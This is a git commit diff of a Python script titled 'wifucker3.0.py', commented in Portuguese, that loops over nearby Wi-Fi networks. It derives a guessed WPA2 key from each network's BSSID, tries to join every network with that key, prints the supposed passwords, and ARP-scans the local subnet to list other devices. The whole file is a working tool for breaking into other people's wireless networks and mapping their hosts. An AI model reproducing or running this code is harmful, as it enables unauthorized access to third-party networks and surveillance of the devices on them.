44d999c947a316924b7e8aa33ad6c4e9434cdc74
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-07-12 16:34:51 -0300

    Update wifucker3.0.py

--- wifucker3.0.py
+++ wifucker3.0.py
@@ -1,86 +1,84 @@
+import time
 import pywifi
 from scapy.all import ARP, Ether, srp
+import subprocess
 
-# Função para obter os dispositivos conectados na rede local
+def verificar_e_instalar_dependencias():
+    try:
+        import pywifi
+        from scapy.all import ARP, Ether, srp
+    except ImportError:
+        print("As dependências 'pywifi' e 'scapy' não estão instaladas.")
+        instalar_dependencias()
+
+def instalar_dependencias():
+    try:
+        subprocess.run(["pip", "install", "pywifi", "scapy"], check=True)
+        print("As dependências 'pywifi' e 'scapy' foram instaladas com sucesso.")
+    except subprocess.CalledProcessError:
+        print("Erro ao instalar as dependências 'pywifi' e 'scapy'. Certifique-se de que o pip está instalado e tente novamente.")
+
 def obter_dispositivos_conectados():
-    # Cria um pacote ARP
     arp = ARP(pdst="192.168.0.1/24")
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     pacote = ether/arp
 
-    # Envia e recebe o pacote ARP
     resultado = srp(pacote, timeout=3, verbose=0)[0]
 
-    # Lista para armazenar os dispositivos encontrados
     dispositivos = []
 
-    # Processa os resultados
     for sent, received in resultado:
         dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})
 
     return dispositivos
 
-# Função para calcular a senha da rede Wi-Fi com base no BSSID
 def calcular_senha(bssid):
-    # Remove os ":" do BSSID
     bssid = bssid.replace(":", "")
-
-    # Remove os dois primeiros dígitos do BSSID
     bssid = bssid[2:]
-
     return bssid
 
-# Inicializa o objeto Wifi
+verificar_e_instalar_dependencias()
+
 wifi = pywifi.PyWiFi()
-
-# Obtém a primeira interface Wi-Fi disponível
 iface = wifi.interfaces()[0]
-
-# Ativa a interface
 iface.enable()
 
-# Obtém a lista de redes Wi-Fi disponíveis
 networks = []
 
-# Loop para conectar-se a todas as redes disponíveis
 while True:
-    # Obtém as redes Wi-Fi disponíveis
+    # Obter as redes Wi-Fi disponíveis
+    iface.scan()
+    time.sleep(5)  # Tempo para o escaneamento das redes
+
+    # Limpar a lista de redes existentes
+    networks = []
+
+    # Atualizar a lista de redes disponíveis
     scan_results = iface.scan_results()
-
-    # Itera sobre as redes disponíveis
     for network in scan_results:
-        # Verifica se a rede já foi adicionada à lista
         if network not in networks:
-            # Calcula a senha da rede Wi-Fi
-            senha_wifi = calcular_senha(network.bssid)
-
-            # Conecta-se à rede escolhida usando a senha calculada
-            perfil = pywifi.Profile()
-            perfil.ssid = network.ssid
-            perfil.auth = pywifi.const.AUTH_ALG_OPEN
-            perfil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
-            perfil.cipher = pywifi.const.CIPHER_TYPE_CCMP
-            perfil.key = senha_wifi
-
-            iface.remove_all_network_profiles()
-            temp_profile = iface.add_network_profile(perfil)
-            iface.connect(temp_profile)
-
-            print(f"Conectado à rede Wi-Fi: {network.ssid} - BSSID: {network.bssid} - Senha: {senha_wifi}")
-
-            # Adiciona a rede à lista de redes conectadas
             networks.append(network)
 
-    # Aguarda até que a conexão seja estabelecida
-    while iface.status() != pywifi.const.IFACE_CONNECTED:
-        pass
+    for network in networks:
+        senha_wifi = calcular_senha(network.bssid)
 
-    print("Conexão Wi-Fi estabelecida!")
+        perfil = pywifi.Profile()
+        perfil.ssid = network.ssid
+        perfil.auth = pywifi.const.AUTH_ALG_OPEN
+        perfil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
+        perfil.cipher = pywifi.const.CIPHER_TYPE_CCMP
+        perfil.key = senha_wifi
 
-    # Obtém a lista de dispositivos conectados
+        iface.remove_all_network_profiles()
+        temp_profile = iface.add_network_profile(perfil)
+        iface.connect(temp_profile)
+
+        print(f"Conectado à rede Wi-Fi: {network.ssid} - BSSID: {network.bssid} - Senha: {senha_wifi}")
+
+    time.sleep(60)  # Aguardar 1 minuto antes de atualizar novamente
+
     dispositivos_conectados = obter_dispositivos_conectados()
 
-    # Imprime os dispositivos conectados
     print("\nDispositivos conectados na rede:")
     for dispositivo in dispositivos_conectados:
         print(f"IP: {dispositivo['IP']} - MAC: {dispositivo['MAC']}")
